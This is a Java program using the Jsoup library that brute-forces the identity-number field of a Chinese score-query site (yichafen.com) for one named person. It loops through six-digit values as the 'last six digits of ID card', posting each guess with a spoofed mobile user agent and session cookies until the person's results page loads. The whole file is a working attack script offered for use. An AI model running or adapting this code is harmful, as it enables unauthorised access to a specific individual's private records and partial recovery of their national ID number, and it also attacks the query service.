package top.novashen;

import org.jsoup.nodes.Document;
import org.jsoup.Jsoup;
import java.util.Map;
import java.util.HashMap;
import java.io.IOException;
import org.jsoup.Connection;
import org.jsoup.select.Elements;
import org.jsoup.nodes.Element;


public class queryClass {
    public static void main(String[] args) {
        //标头

        for (int i = 241410; i < 999999 ; i++) {
            String userAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A403 Safari/8536.25";
            //插入信息
            Map<String,String> body = new HashMap<>();

            body.put("s_xingming", "申宇航");//姓名
            body.put("s_shenfenzhenghou6wei", String.valueOf(i));//身份证后六位
            System.out.println("Now is "+i);
            try {
                Connection.Response res = Jsoup.connect("https://440114.yichafen.com/public/queryscore/sqcode/MszcgnxmMzQ5MHw2NWJiMWIzMzkwZTAwN2EzNzJkN2E5Y2RmOGQ5MDk1MXw0NDAxMTQO0O0O.html").execute();
                System.out.println(res.cookies());
                Map<String,String> cookies = res.cookies();

                Jsoup.connect("https://440114.yichafen.com/public/checkcondition/sqcode/MszcgnxmMzQ5MHw2NWJiMWIzMzkwZTAwN2EzNzJkN2E5Y2RmOGQ5MDk1MXw0NDAxMTQO0O0O/htmlType/default.html")
                        .data(body)
                        .cookies(cookies)
                        .header("User-Agent", userAgent)
                        .post();
                Document doc1 = Jsoup.connect("https://440114.yichafen.com/public/queryresult.html")
                        .cookies(cookies)
                        .header("User-Agent", userAgent)
                        .header("Referer", "https://440114.yichafen.com/public/queryscore/sqcode/MszcgnxmMzQ5MHw2NWJiMWIzMzkwZTAwN2EzNzJkN2E5Y2RmOGQ5MDk1MXw0NDAxMTQO0O0O.html")
                        .get();
                Elements titles = doc1.getElementsByClass("left_cell");
                Elements values = doc1.getElementsByClass("right_cell");
                // for (Element e : titles) {
                //     System.out.println("title:" + e.text());
                // }
                // for (Element e : values) {
                //     System.out.println("value:" + e.text());
                // }
                System.out.println(doc1);
                if (!titles.isEmpty()){
                    System.out.println(i+"is right");
                    break;
                }

            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}